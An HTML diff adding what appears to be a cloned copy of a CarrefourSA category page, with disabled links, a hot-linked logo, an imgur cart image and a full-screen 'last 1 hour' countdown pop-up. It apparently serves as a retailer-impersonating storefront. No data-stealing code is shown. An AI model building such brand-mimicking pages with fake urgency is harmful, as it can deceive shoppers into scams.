@@ -1,0 +1,3944 @@
+<!DOCTYPE html>
+<html class="js" lang="tr">
+ <head>
+  <meta content="width=device-width, initial-scale=1" name="viewport"/>
+  <title>
+   CarrefourSA
+  </title>
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js">
+  </script>
+  <meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+  <meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+  <meta charset="utf-8"/>
+  <meta content="#005baa" name="theme-color"/>
+  <meta content="no-referrer-when-downgrade" name="referrer"/>
+  <link defer="" href="./assets/main.css" media="all" rel="stylesheet" type="text/css"/>
+  <link as="font" crossorigin="anonymous" href="https://reimg-carrefour.mncdn.com/googlefonts/google-fonts.css" rel="preload"/>
+  <link href="https://reimg-carrefour.mncdn.com/googlefonts/google-fonts.css" rel="stylesheet"/>
+ </head>
+ <div class="container">
+  <div id="countdown-modal" style="position: fixed; inset: 0; background: rgba(0,0,0,0.6); display: flex; align-items: center; justify-content: center; z-index: 9999;">
+   <div id="carrefour-countdown" style="background: linear-gradient(135deg, #0056a3, #0077c1); padding: 20px 18px; border-radius: 10px; text-align: center; box-shadow: 0 12px 30px rgba(0,0,0,0.25); width: 92%; max-width: 520px; color: white; position: relative; overflow: hidden; border: 1px solid rgba(255,213,0,0.3);" tabindex="-1">
+    <button aria-label="Kapat" id="countdown-close" style="position: absolute; top: 10px; right: 10px; background: rgba(255,255,255,0.15); border: 0; color: #fff; width: 28px; height: 28px; border-radius: 50%; cursor: pointer;">
+     ×
+    </button>
+    <div style="display: flex; align-items: center; justify-content: center; margin-bottom: 10px; gap: 8px;">
+     <svg class="carrefour-flash-icon" fill="#FFD500" height="20" viewbox="0 0 24 24" width="20" xmlns="http://www.w3.org/2000/svg">
+      <path d="M12 2C6.486 2 2 6.486 2 12s4.486 10 10 10 10-4.486 10-10S17.514 2 12 2zm0 18c-4.411 0-8-3.589-8-8s3.589-8 8-8 8 3.589 8 8-3.589 8-8 8z">
+      </path>
+      <path d="M13 7h-2v6h6v-2h-4z">
+      </path>
+     </svg>
+     <h4 style="margin: 0; font-size: 18px; font-weight: 700; text-shadow: 0 1px 2px rgba(0,0,0,0.15); color: white; letter-spacing: .5px;">
+      SON 1 SAAT
+     </h4>
+    </div>
+    <div id="countdown" style="display: flex; justify-content: center; gap: 10px; margin: 8px auto 0; font-family: 'Arial', sans-serif;">
+     <div style="background: rgba(255,255,255,0.15); border-radius: 8px; padding: 10px 12px; min-width: 62px; border: 1px solid rgba(255,255,255,0.2);">
+      <span id="days" style="font-size: 24px; font-weight: 800; display: block; line-height: 1; color: white;">
+       00
+      </span>
+      <span style="font-size: 10px; font-weight: 600; text-transform: uppercase; letter-spacing: .5px; margin-top: 4px; display: block; color: rgba(255,255,255,0.9);">
+       GÜN
+      </span>
+     </div>
+     <div style="font-size: 22px; font-weight: 700; display: flex; align-items: center; color: #FFD500; padding: 0 2px; margin-top: -6px;">
+      :
+     </div>
+     <div style="background: rgba(255,255,255,0.15); border-radius: 8px; padding: 10px 12px; min-width: 62px; border: 1px solid rgba(255,255,255,0.2);">
+      <span id="hours" style="font-size: 24px; font-weight: 800; display: block; line-height: 1; color: white;">
+       00
+      </span>
+      <span style="font-size: 10px; font-weight: 600; text-transform: uppercase; letter-spacing: .5px; margin-top: 4px; display: block; color: rgba(255,255,255,0.9);">
+       SAAT
+      </span>
+     </div>
+     <div style="font-size: 22px; font-weight: 700; display: flex; align-items: center; color: #FFD500; padding: 0 2px; margin-top: -6px;">
+      :
+     </div>
+     <div style="background: rgba(255,255,255,0.15); border-radius: 8px; padding: 10px 12px; min-width: 62px; border: 1px solid rgba(255,255,255,0.2);">
+      <span id="minutes" style="font-size: 24px; font-weight: 800; display: block; line-height: 1; color: white;">
+       00
+      </span>
+      <span style="font-size: 10px; font-weight: 600; text-transform: uppercase; letter-spacing: .5px; margin-top: 4px; display: block; color: rgba(255,255,255,0.9);">
+       DAKİKA
+      </span>
+     </div>
+     <div style="font-size: 22px; font-weight: 700; display: flex; align-items: center; color: #FFD500; padding: 0 2px; margin-top: -6px;">
+      :
+     </div>
+     <div style="background: rgba(255,255,255,0.15); border-radius: 8px; padding: 10px 12px; min-width: 62px; border: 1px solid rgba(255,255,255,0.2);">
+      <span id="seconds" style="font-size: 24px; font-weight: 800; display: block; line-height: 1; color: white;">
+       00
+      </span>
+      <span style="font-size: 10px; font-weight: 600; text-transform: uppercase; letter-spacing: .5px; margin-top: 4px; display: block; color: rgba(255,255,255,0.9);">
+       SANİYE
+      </span>
+     </div>
+    </div>
+    <div style="margin-top: 12px; font-size: 12px; font-weight: 600; color: rgba(255,255,255,0.95);">
+     Bu fırsatları kaçırmayın!
+    </div>
+   </div>
+  </div>
+ </div>
+ <body class="page-productGrid pageType-CategoryPage template-pages-category-productGridPage language-tr page-loading">
+  <div class="loading-layout">
+  </div>
+  <div class="la-anim-1 hidden">
+  </div>
+  <main data-currency-iso-code="TRY">
+   <div class="top-header-slot">
+    <div class="yCmsContentSlot container">
+    </div>
+   </div>
+   <header class="main-header main-header-md clearfix">
+    <div class="container">
+     <div class="md-secondary-navigation">
+      <ul class="main-top-header">
+       <li class="yCmsComponent">
+        <a href="javascript:void(0);" rel="noopener noreferrer" title="Mağazalarımız">
+         Mağazalarımız
+        </a>
+       </li>
+       <li class="yCmsComponent">
+        <a href="javascript:void(0);" title="Kurumsal">
+         Kurumsal
+        </a>
+       </li>
+       <li class="yCmsComponent">
+        <a href="javascript:void(0);" rel="noopener noreferrer" title="Shopsa.com.tr">
+         Shopsa.com.tr
+        </a>
+       </li>
+       <li class="yCmsComponent">
+        <a href="javascript:void(0);" rel="noopener noreferrer" title="Lezzet Arası">
+         Lezzet Arası
+        </a>
+       </li>
+       <li class="yCmsComponent">
+        <a class="campaign-on-header" href="javascript:void(0);" style="color:#e50019" title="Bayilik Başvuru Formu">
+         Bayilik Başvuru Formu
+        </a>
+       </li>
+       <li class="yCmsComponent">
+        <a class="order-tracking-btn js-guest-track-order-link hidden" href="javascript:void(0);" title="Sipariş Takibi">
+         Sipariş Takibi
+        </a>
+       </li>
+      </ul>
+     </div>
+     <div class="hidden-xs hidden-sm col-md-12 accNavComponentDesktop collapse" id="accNavComponentDesktop">
+      <ul class="">
+      </ul>
+     </div>
+     <div class="sm-navigation">
+      <div class="header-middle">
+       <div class="hamburger-icon-wrapper">
+        <button class="btn js-toggle-footer-modal" type="button">
+         <span class="footer-menu-hamburger">
+         </span>
+        </button>
+       </div>
+       <div class="site-logo head-row">
+        <div id="preload-links">
+        </div>
+        <div class="simple-banner-component no-ad">
+         <a href="javascript:void(0);">
+          <img alt="" data-gowitadid="" data-isadvertised="" data-name="Site Logo Component" data-real="carrefoursa_logo_svg" data-uid="SiteLogoComponent" loading="eager" src="https://reimg-carrefour.mncdn.com/staticimage/carrefoursacom-logo.svg" title=""/>
+         </a>
+        </div>
+       </div>
+       <div class="search-box-cont head-row">
+        <div class="site-search ui-front">
+         <form action="" class="js-site-search-form" method="get" name="search_form_SearchBox">
+          <div class="input-group">
+           <input class="form-control js-site-search-input" data-options='{"autocompleteUrl" : "/search/autocomplete/SearchBox","minCharactersBeforeRequest" : "3","waitTimeBeforeRequest" : "500","displayProductImages" : true}' id="js-site-search-input" maxlength="100" name="text" onfocus="this.value=''" placeholder="Ürün Arayın..." type="text"/>
+           <span class="input-group-btn">
+            <button class="btn btn-link js-search-validate" type="submit">
+             <span>
+              Ara
+             </span>
+            </button>
+           </span>
+          </div>
+         </form>
+        </div>
+       </div>
+       <div class="call-center head-row">
+        <a href="javascript:void(0);">
+         <i class="icon-call-center">
+         </i>
+         <span>
+          Sizi Dinliyoruz
+         </span>
+        </a>
+       </div>
+       <div class="order-tracking">
+        <a class="order-tracking-btn js-guest-track-order-link" href="javascript:void(0);">
+         Sipariş Takip
+        </a>
+       </div>
+       <div class="user-infos-cont head-row anonymous">
+        <ul class="before-login">
+         <li class="d-md-none">
+          <a class="js-login-popup" href="javascript:void(0);">
+           <i class="icon-user-name">
+           </i>
+          </a>
+         </li>
+         <li class="liOffcanvas d-sm-none">
+          <i class="icon-user-name">
+          </i>
+          <a class="js-login-popup" href="javascript:void(0);">
+           Giriş Yap
+          </a>
+          <span class="sep">
+           |
+          </span>
+          <a class="js-register-popup" href="javascript:void(0);">
+           Üye Ol
+          </a>
+         </li>
+        </ul>
+       </div>
+       <div class="head-row mini-cart-cnt">
+        <div class="yCmsContentSlot componentContainer">
+         <div class="yCmsComponent" id="sepeteklendi">
+          <div class="header-cart">
+           <a class="mini-cart-link js-mini-cart-link" href="sepet">
+            <div class="mini-cart-icon">
+             <span class="icon-top-mini-cart">
+             </span>
+            </div>
+            <div class="mini-cart-price js-mini-cart-price">
+             <span class="js-minicart-total-price">
+              0.00 TL
+             </span>
+            </div>
+            <i class="icon-cart-arrow-down">
+            </i>
+           </a>
+           <div class="csa-mini-cart-container" style="display:none;">
+           </div>
+          </div>
+         </div>
+        </div>
+       </div>
+      </div>
+     </div>
+    </div>
+    <div class="nav-cont">
+     <div class="container">
+      <div class="menu-back">
+      </div>
+      <div class="store-select">
+       <ul class="user-logged-in-false">
+        <li class="selectDeliveryChoice" id="selectDeliveryChoice">
+         <div class="js-select-delivery-choise delivery-choice-active-true">
+          <span class="isPickUpActive-true delivery-choice-cont">
+           <i class="icon-delivery-cargo">
+           </i>
+           <span class="select-delivery-choice-title">
+            Teslimat Seçeneği
+           </span>
+           <span class="latest-choice">
+            Size Getirelim
+           </span>
+          </span>
+         </div>
+        </li>
+        <li class="selectStoreCanvas select-store-canvas-full user-logged-in-false" id="selectStoreCanvas">
+         <a class="select-store-link js-select-store-link clearfix" data-select-store-text="Bölgenizi Öğrenebilir Miyiz?" data-select-store-url="/select-store?useCookie=true" href="javascript:void(0);">
+          <span class="selectStoreCanvas" id="selectStoreCanvasText">
+           <i class="icon-map-marker">
+           </i>
+           <span class="delivery-area-title">
+            Teslimat Bölgesi
+           </span>
+           <span class="delivery-address-name">
+            Kozyatağı Mh.
+           </span>
+          </span>
+         </a>
+        </li>
+        <li class="select-delivery-store user-logged-in-false" id="selectDeliverySlot">
+         <ycommerce:testid code="header_deliverySlot">
+          <a class="displayDeliverySlot" data-delivery-slot-popup-header="Bölgenizin Teslimat Saatleri" data-delivery-slot-url="/delivery-slots?isPickUp=false&amp;isSacrifice=false" href="javascript:void(0);">
+           <div class="delivery-slot-area">
+            <i class="icon-delivery-clock">
+            </i>
+            <span class="delivery-time-text">
+             Teslimat Zamanı
+            </span>
+            <div class="nearest-delivery">
+             <span class="nearest-delivery-title">
+              En Yakın Teslimat
+             </span>
+             <div class="nearest-delivery-time">
+              10:30 - 13:30 Çarşamba
+             </div>
+            </div>
+           </div>
+          </a>
+         </ycommerce:testid>
+        </li>
+       </ul>
+      </div>
+     </div>
+     <div class="category-mobile-filter">
+      <div class="total-search-count">
+       <span class="facet-pr-number">
+        31 Ürün
+       </span>
+      </div>
+      <div class="order-and-filter">
+       <div class="category-filter-mobile" onclick="document.getElementById('colorbox').style.display = 'block'; document.body.style.overflow = 'hidden'; document.body.style.height = '0px';">
+        <a href="javascript:void(0);">
+         <span class="cat-text">
+          Filtrele
+         </span>
+         <span class="glyphicon glyphicon-filter">
+         </span>
+        </a>
+       </div>
+       <div class="category-order-mobile">
+        <a href="javascript:void(0);">
+         <span class="cat-text">
+          Çok Satanlar
+         </span>
+         <span class="glyphicon glyphicon-sort-by-attributes">
+         </span>
+         <span class="cat-text-seperator">
+          |
+         </span>
+        </a>
+       </div>
+      </div>
+     </div>
+     <div class="hidden">
+      <div class="quickSalesInfoContainer">
+       <p>
+        Hızlı gelsin siparişlerinizin teslimatını hızlı kuryelerimiz ile gerçekleştirmekteyiz.Bu nedenle siparişinizde yer alan ürünlerin miktarı kurye araçlarımızın güvenli taşıma kapasitesi ile sınırlanmaktadır.
+        <br/>
+        <br/>
+        İhtiyacınız olan ürünlerin tamamını tek bir Hızlı Gelsin siparişi ile satın alamıyorsanız, siparişinizi bir kaç farklı sipariş vererek satın alabilirsiniz.
+       </p>
+       <p>
+        <a class="btn btn-default btn-block closeColorBox">
+         Tamam
+        </a>
+       </p>
+      </div>
+     </div>
+     <div class="hidden">
+      <div class="quickSalesMaxDesiContainer">
+       <p>
+        Bu ürünü eklerseniz Hızlı Gelsin ile getirebileceğimiz limiti aşacağınız için ürünü sepetinize ekleyemiyoruz.
+        <br/>
+        <br/>
+        Bu ürünü de Hızlı gelsin ile almak istiyorsanız, bu sepetinizin siparişini verip, yeni bir sipariş oluşturabilirsiniz.
+       </p>
+       <p>
+        <a class="btn btn-default btn-block closeColorBox">
+         Hızlı Gelsin ile Devam Et
+        </a>
+       </p>
+       <p>
+        <a class="btn btn-default btn-block normal-mode">
+         Hızlı Gelsin’den Çık
+        </a>
+       </p>
+      </div>
+     </div>
+     <div class="hidden">
+      <div class="quickSalesCutOffTimeContainer">
+       <p>
+       </p>
+       <p>
+        <a class="btn btn-default btn-block closeColorBox">
+         Tamam
+        </a>
+       </p>
+      </div>
+     </div>
+     <div class="hidden">
+      <div class="quickSalesProductAddingNotAllowedContainer">
+       <p>
+        Siparişiniz Hızlı Gelsin’de belli ürünleri sizlere sunabilmekteyiz. Dolayısı ile aşağıdaki ürünler sepetinizden çıkartılacaktır.
+       </p>
+       <div class="js-quick-sales-products">
+       </div>
+       <p>
+        <a class="btn btn-default btn-block js-confirm-quicksales-products">
+         Hızlı Gelsin ile Devam Et
+        </a>
+       </p>
+       <p>
+        <a class="btn btn-secondary btn-block normal-mode">
+         Hızlı Gelsin’den Çık
+        </a>
+       </p>
+      </div>
+     </div>
+     <div class="hidden">
+      <div class="siparisEkStoreErrorContainer">
+       <p>
+        Teslimat bölgenizi değiştirdiğiniz durumda önceki siparişinize ek yapılamayacak ürünleriniz seçmiş olduğunuz teslimat bölgesine yeni sipariş olarak gönderilecektir.
+       </p>
+       <p>
+        <a class="btn btn-primary btn-block js-additional-order-cont">
+         Tamam
+        </a>
+       </p>
+       <p>
+        <a class="btn btn-outline-primary btn-block js-additional-order-cancel closeColorBox">
+         Vazgeç
+        </a>
+       </p>
+      </div>
+     </div>
+     <div class="hidden">
+      <div class="cart-empty-confirm-popup" id="popup_confirm_empty_cart">
+       <div class="popup">
+        <span class="pop-title text-center empty-popup-title">
+         Sepetinizdeki tüm ürünleri silmek istiyor musunuz?
+        </span>
+        <div class="confirm-buttons">
+         <a class="btn btn-default closeColorBox empty-cart-cancel-btn">
+          Vazgeç
+         </a>
+         <ycommerce:testid code="emptyCart_confirm_button">
+          <a class="btn btn-default js-empty-cart-confirm-link empty-cart-confirm-btn" data-empty-cart-url="/cart/empty">
+           Evet, Sil
+          </a>
+         </ycommerce:testid>
+        </div>
+       </div>
+      </div>
+     </div>
+     <div class="hidden">
+      <div class="delete-cart-item-confirm-popup" id="popup_confirm_delete_cart_product">
+       <div class="popup">
+        <span class="pop-title text-center delete-cart-item-popup-title">
+         Ürünü sepetinizden çıkartmak istediğinize emin misiniz?
+        </span>
+        <div class="confirm-buttons">
+         <ycommerce:testid code="emptyCart_confirm_button">
+          <a class="btn btn-default js-delete-cart-item-confirm-link delete-cart-item-confirm-btn">
+           Evet, Sil
+          </a>
+         </ycommerce:testid>
+         <a class="btn btn-default closeColorBox add-cart-item-favorite-btn">
+          <span class="delete-and-favorite-icon">
+           <span class="inner-plus-icon">
+            +
+           </span>
+          </span>
+          Sil ve Favorilere Ekle
+         </a>
+        </div>
+       </div>
+      </div>
+     </div>
+     <div class="hidden">
+      <div class="reorder-confirm-popup" id="popup_confirm_reorder">
+       <div class="popup">
+        <span class="pop-title">
+         Mevcut sepetinizdeki ürünler silinecektir.
+        </span>
+        <div class="confirm-buttons">
+         <ycommerce:testid code="emptyCart_confirm_button_reorder">
+          <a class="btn btn-default js-confirm-link_reorder">
+           Tamam
+          </a>
+         </ycommerce:testid>
+         <a class="btn btn-default closeColorBox reorder-cancel-btn">
+          Vazgeç
+         </a>
+        </div>
+       </div>
+      </div>
+     </div>
+     <div class="hidden">
+      <div class="repeatOrderResetCartConfirm">
+       <p class="repeatOrderResetCartConfirm_text">
+       </p>
+       <div class="confirm-buttons">
+        <a class="btn btn-default btn-block closeColorBox">
+         Tamam
+        </a>
+       </div>
+      </div>
+     </div>
+     <div class="hidden">
+      <div class="repeatOrderUserInformation">
+       <p class="repeatOrderUserInformation_text">
+       </p>
+       <div class="confirm-buttons">
+        <a class="btn btn-default btn-block closeColorBox">
+         Tamam
+        </a>
+       </div>
+      </div>
+     </div>
+     <div class="hidden">
+      <div class="addToCartWarningModalContainer">
+       <p id="warning-text">
+       </p>
+       <p>
+        <a class="btn btn-default btn-block closeColorBox">
+         Tamam
+        </a>
+       </p>
+      </div>
+     </div>
+     <div class="hidden">
+      <div class="addToCartWarningModalMiniCartContainer">
+       <p id="mini-cart-warning-text">
+       </p>
+       <p>
+        <a class="btn btn-default btn-block closeColorBoxButton">
+         Tamam
+        </a>
+       </p>
+      </div>
+     </div>
+     <div class="hidden">
+      <div class="addtoOrderWarningModal">
+       <div class="col-xs-12">
+        <p class="addtoOrderWarningModalText">
+        </p>
+        <p>
+         <a class="btn btn-default btn-block closeColorBox">
+          Tamam
+         </a>
+        </p>
+       </div>
+      </div>
+     </div>
+     <div class="hidden">
+      <div class="phoneNumberUpdateWarningContainer">
+       <p>
+        Cep telefonu numaranızı değiştirdiğinizde güvenliğiniz için hesabınız ile ilişkili kayıtlı kredi kartlarınız sistemimizden silinecektir.
+       </p>
+       <p>
+        <a class="btn btn-default btn-block" href="javascript:void(0);" onclick="parent.$.colorbox.close(); return false;">
+         Tamam
+        </a>
+       </p>
+      </div>
+     </div>
+     <div class="hidden">
+      <div class="guestTrackOrder">
+       <form action="#" class="mx-4" id="guestTrackOrderForm" method="GET">
+        <p class="mt-4">
+         Siparişinizi takip edebilmek için lütfen sipariş numaranızı giriniz.
+        </p>
+        <div class="form-group">
+         <label class="control-label" for="guest_phoneNumber">
+          Telefon Numarası
+         </label>
+         <input autocomplete="off" class="personal_phoneNumber form-control" id="guest_phoneNumber" inputmode="tel" name="mobileNumber" placeholder="5__ ___ __ __" type="text" value=""/>
+         <span class="error-message red">
+         </span>
+        </div>
+        <div class="form-group">
+         <label class="control-label" for="orderCode">
+          Sipariş Numaranız
+         </label>
+         <input autocomplete="off" class="form-control" id="orderCode" name="orderCode" placeholder="___ ___ __ __" type="tel" value=""/>
+         <span class="error-message red">
+         </span>
+        </div>
+        <div class="form-group">
+         <button class="btn btn-primary btn-block btn-login-register-preference js-guest-track-order-btn" type="button">
+          Devam
+         </button>
+        </div>
+       </form>
+      </div>
+     </div>
+     <div class="hidden">
+      <div class="pickupChoicePopupContent">
+       <div class="pickupChoice">
+        <div class="pickupChoice__pickup-desc active">
+         <span>
+         </span>
+        </div>
+        <div class="pickupChoice__footer">
+         <button class="btn btn-primary pickup-info-submit" type="button">
+          Devam et
+         </button>
+        </div>
+       </div>
+      </div>
+     </div>
+    </div>
+   </header>
+   <div class="mobile-header-tabbar">
+    <nav class="tabbar-nav">
+     <div class="mobile-header-link">
+      <a href="/">
+       <i class="home-icon">
+       </i>
+       <span>
+        Ana Sayfa
+       </span>
+      </a>
+     </div>
+     <div class="mobile-header-link open-category-modal">
+      <a class="js-toggle-sm-navigation" type="button">
+       <i class="categories-icon">
+       </i>
+       <span>
+        Kategoriler
+       </span>
+      </a>
+     </div>
+     <div class="mobile-header-link csa-app-button">
+      <a class="js-tabbar-cart-link" href="/sepet">
+       <img decoding="async" height="71" loading="lazy" src="https://i.imgur.com/7VVCuZK.png" width="71"/>
+      </a>
+     </div>
+     <div class="mobile-header-link">
+      <a href="javascript:void(0);">
+       <i class="campaigns-icon">
+       </i>
+       <span>
+        Kampanyalar
+       </span>
+      </a>
+     </div>
+     <div class="mobile-header-link">
+      <a class="js-mobile-profile">
+       <i class="icon-user-profile">
+       </i>
+       <span>
+        Profilim
+       </span>
+      </a>
+     </div>
+     <div class="menu_border">
+     </div>
+    </nav>
+    <div class="svg-container">
+     <svg viewbox="0 0 202.9 45.5">
+      <clippath clippathunits="objectBoundingBox" id="menu" transform="scale(0.0049285362247413 0.021978021978022)">
+       <path d="M6.7,45.5c5.7,0.1,14.1-0.4,23.3-4c5.7-2.3,9.9-5,18.1-10.5c10.7-7.1,11.8-9.2,20.6-14.3c5-2.9,9.2-5.2,15.2-7
+                        c7.1-2.1,13.3-2.3,17.6-2.1c4.2-0.2,10.5,0.1,17.6,2.1c6.1,1.8,10.2,4.1,15.2,7c8.8,5,9.9,7.1,20.6,14.3c8.3,5.5,12.4,8.2,18.1,10.5
+                        c9.2,3.6,17.6,4.2,23.3,4H6.7z">
+       </path>
+      </clippath>
+     </svg>
+    </div>
+   </div>
+   <div class="breadcrumbArea">
+    <div class="breadcrumb-section">
+     <!-- ... -->
+    </div>
+    <div class="breadcrumb-section">
+     <div class="container hidden-xs">
+      <ol class="breadcrumb">
+       <li>
+        <a href="javascript:void(0);">
+         <span class="glyphicon glyphicon-home">
+         </span>
+        </a>
+       </li>
+       <li>
+        <a href="javascript:void(0);">
+         CarrefourSA Özel
+        </a>
+       </li>
+      </ol>
+     </div>
+    </div>
+   </div>
+   <div class="yCmsContentSlot container">
+   </div>
+   <div class="container">
+    <div class="row">
+     <div class="container">
+     </div>
+    </div>
+    <div class="row">
+     <div class="col-md-2 col-lg-2 hidden-sm hidden-xs product-facet js-product-facet" id="product-facet">
+      <div class="cornerLeftElement">
+       <h1>
+        CarrefourSA Özel
+       </h1>
+       <span class="facet-pr-number">
+        <strong style="font-style: normal; margin-right: 3px;">
+         31
+        </strong>
+        ürün bulundu
+       </span>
+      </div>
+      <div class="facet js-facet">
+       <div class="facet-name js-facet-name">
+        Elektrikli Ev Aletleri
+       </div>
+      </div>
+      <div class="facet js-facet js-mobile-facet other-facets">
+       <div class="facet-name js-facet-name">
+        Marka
+       </div>
+       <div class="facet-values js-facet-values js-facet-form">
+        <ul class="facet-list js-facet-list">
+         <li>
+          <label>
+           <input class="facet-checkbox js-facet-checkbox sr-only" disabled="" type="checkbox"/>
+           <span class="facet-label">
+            <a href="/?filtre=Stanley">
+             <span class="facet-mark">
+             </span>
+            </a>
+            <span>
+             <a class="brand-capitalize-name" hidden="true" href="javascript:void(0);" rel="nofollow">
+              Stanley
+             </a>
+             <a href="/?filtre=Stanley">
+              <span id="name">
+               Stanley
+              </span>
+             </a>
+            </span>
+           </span>
+          </label>
+         </li>
+         <li>
+          <label>
+           <input class="facet-checkbox js-facet-checkbox sr-only" disabled="" type="checkbox"/>
+           <span class="facet-label">
+            <a href="/?filtre=Philips">
+             <span class="facet-mark">
+             </span>
+            </a>
+            <span>
+             <a class="brand-capitalize-name" hidden="true" href="javascript:void(0);" rel="nofollow">
+              Philips
+             </a>
+             <a href="/?filtre=Philips">
+              <span id="name">
+               Philips
+              </span>
+             </a>
+            </span>
+           </span>
+          </label>
+         </li>
+         <li>
+          <label>
+           <input class="facet-checkbox js-facet-checkbox sr-only" disabled="" type="checkbox"/>
+           <span class="facet-label">
+            <a href="/?filtre=Fissler">
+             <span class="facet-mark">
+             </span>
+            </a>
+            <span>
+             <a class="brand-capitalize-name" hidden="true" href="javascript:void(0);" rel="nofollow">
+              Fissler
+             </a>
+             <a href="/?filtre=Fissler">
+              <span id="name">
+               Fissler
+              </span>
+             </a>
+            </span>
+           </span>
+          </label>
+         </li>
+         <li>
+          <label>
+           <input class="facet-checkbox js-facet-checkbox sr-only" disabled="" type="checkbox"/>
+           <span class="facet-label">
+            <a href="/?filtre=Beko">
+             <span class="facet-mark">
+             </span>
+            </a>
+            <span>
+             <a class="brand-capitalize-name" hidden="true" href="javascript:void(0);" rel="nofollow">
+              Beko
+             </a>
+             <a href="/?filtre=Beko">
+              <span id="name">
+               Beko
+              </span>
+             </a>
+            </span>
+           </span>
+          </label>
+         </li>
+         <li>
+          <label>
+           <input class="facet-checkbox js-facet-checkbox sr-only" disabled="" type="checkbox"/>
+           <span class="facet-label">
+            <a href="/?filtre=Samsung">
+             <span class="facet-mark">
+             </span>
+            </a>
+            <span>
+             <a class="brand-capitalize-name" hidden="true" href="javascript:void(0);" rel="nofollow">
+              Samsung
+             </a>
+             <a href="/?filtre=Samsung">
+              <span id="name">
+               Samsung
+              </span>
+             </a>
+            </span>
+           </span>
+          </label>
+         </li>
+         <li>
+          <label>
+           <input class="facet-checkbox js-facet-checkbox sr-only" disabled="" type="checkbox"/>
+           <span class="facet-label">
+            <a href="/?filtre=Bosch">
+             <span class="facet-mark">
+             </span>
+            </a>
+            <span>
+             <a class="brand-capitalize-name" hidden="true" href="javascript:void(0);" rel="nofollow">
+              Bosch
+             </a>
+             <a href="/?filtre=Bosch">
+              <span id="name">
+               Bosch
+              </span>
+             </a>
+            </span>
+           </span>
+          </label>
+         </li>
+         <li>
+          <label>
+           <input class="facet-checkbox js-facet-checkbox sr-only" disabled="" type="checkbox"/>
+           <span class="facet-label">
+            <a href="/?filtre=Xiaomi">
+             <span class="facet-mark">
+             </span>
+            </a>
+            <span>
+             <a class="brand-capitalize-name" hidden="true" href="javascript:void(0);" rel="nofollow">
+              Xiaomi
+             </a>
+             <a href="/?filtre=Xiaomi">
+              <span id="name">
+               Xiaomi
+              </span>
+             </a>
+            </span>
+           </span>
+          </label>
+         </li>
+         <li>
+          <label>
+           <input class="facet-checkbox js-facet-checkbox sr-only" disabled="" type="checkbox"/>
+           <span class="facet-label">
+            <a href="/?filtre=Apple">
+             <span class="facet-mark">
+             </span>
+            </a>
+            <span>
+             <a class="brand-capitalize-name" hidden="true" href="javascript:void(0);" rel="nofollow">
+              Apple
+             </a>
+             <a href="/?filtre=Apple">
+              <span id="name">
+               Apple
+              </span>
+             </a>
+            </span>
+           </span>
+          </label>
+         </li>
+         <li>
+          <label>
+           <input class="facet-checkbox js-facet-checkbox sr-only" disabled="" type="checkbox"/>
+           <span class="facet-label">
+            <a href="/?filtre=Lenovo">
+             <span class="facet-mark">
+             </span>
+            </a>
+            <span>
+             <a class="brand-capitalize-name" hidden="true" href="javascript:void(0);" rel="nofollow">
+              Lenovo
+             </a>
+             <a href="/?filtre=Lenovo">
+              <span id="name">
+               Lenovo
+              </span>
+             </a>
+            </span>
+           </span>
+          </label>
+         </li>
+         <li>
+          <label>
+           <input class="facet-checkbox js-facet-checkbox sr-only" disabled="" type="checkbox"/>
+           <span class="facet-label">
+            <a href="/?filtre=DYSON">
+             <span class="facet-mark">
+             </span>
+            </a>
+            <span>
+             <a class="brand-capitalize-name" hidden="true" href="javascript:void(0);" rel="nofollow">
+              DYSON
+             </a>
+             <a href="/?filtre=DYSON">
+              <span id="name">
+               DYSON
+              </span>
+             </a>
+            </span>
+           </span>
+          </label>
+         </li>
+         <li>
+          <label>
+           <input class="facet-checkbox js-facet-checkbox sr-only" disabled="" type="checkbox"/>
+           <span class="facet-label">
+            <a href="/?filtre=Volta">
+             <span class="facet-mark">
+             </span>
+            </a>
+            <span>
+             <a class="brand-capitalize-name" hidden="true" href="javascript:void(0);" rel="nofollow">
+              Volta
+             </a>
+             <a href="/?filtre=Volta">
+              <span id="name">
+               Volta
+              </span>
+             </a>
+            </span>
+           </span>
+          </label>
+         </li>
+         <li>
+          <label>
+           <input class="facet-checkbox js-facet-checkbox sr-only" disabled="" type="checkbox"/>
+           <span class="facet-label">
+            <a href="/?filtre=Huawei">
+             <span class="facet-mark">
+             </span>
+            </a>
+            <span>
+             <a class="brand-capitalize-name" hidden="true" href="javascript:void(0);" rel="nofollow">
+              Huawei
+             </a>
+             <a href="/?filtre=Huawei">
+              <span id="name">
+               Huawei
+              </span>
+             </a>
+            </span>
+           </span>
+          </label>
+         </li>
+         <li>
+          <label>
+           <input class="facet-checkbox js-facet-checkbox sr-only" disabled="" type="checkbox"/>
+           <span class="facet-label">
+            <a href="/?filtre=Karaca ">
+             <span class="facet-mark">
+             </span>
+            </a>
+            <span>
+             <a class="brand-capitalize-name" hidden="true" href="javascript:void(0);" rel="nofollow">
+              Karaca
+             </a>
+             <a href="/?filtre=Karaca ">
+              <span id="name">
+               Karaca
+              </span>
+             </a>
+            </span>
+           </span>
+          </label>
+         </li>
+         <li>
+          <label>
+           <input class="facet-checkbox js-facet-checkbox sr-only" disabled="" type="checkbox"/>
+           <span class="facet-label">
+            <a href="/?filtre=POCO">
+             <span class="facet-mark">
+             </span>
+            </a>
+            <span>
+             <a class="brand-capitalize-name" hidden="true" href="javascript:void(0);" rel="nofollow">
+              POCO
+             </a>
+             <a href="/?filtre=POCO">
+              <span id="name">
+               POCO
+              </span>
+             </a>
+            </span>
+           </span>
+          </label>
+         </li>
+         <li>
+          <label>
+           <input class="facet-checkbox js-facet-checkbox sr-only" disabled="" type="checkbox"/>
+           <span class="facet-label">
+            <a href="/?filtre=Seg">
+             <span class="facet-mark">
+             </span>
+            </a>
+            <span>
+             <a class="brand-capitalize-name" hidden="true" href="javascript:void(0);" rel="nofollow">
+              Seg
+             </a>
+             <a href="/?filtre=Seg">
+              <span id="name">
+               Seg
+              </span>
+             </a>
+            </span>
+           </span>
+          </label>
+         </li>
+         <li>
+          <label>
+           <input class="facet-checkbox js-facet-checkbox sr-only" disabled="" type="checkbox"/>
+           <span class="facet-label">
+            <a href="/?filtre=BAYMAK">
+             <span class="facet-mark">
+             </span>
+            </a>
+            <span>
+             <a class="brand-capitalize-name" hidden="true" href="javascript:void(0);" rel="nofollow">
+              BAYMAK
+             </a>
+             <a href="/?filtre=BAYMAK">
+              <span id="name">
+               BAYMAK
+              </span>
+             </a>
+            </span>
+           </span>
+          </label>
+         </li>
+         <li>
+          <label>
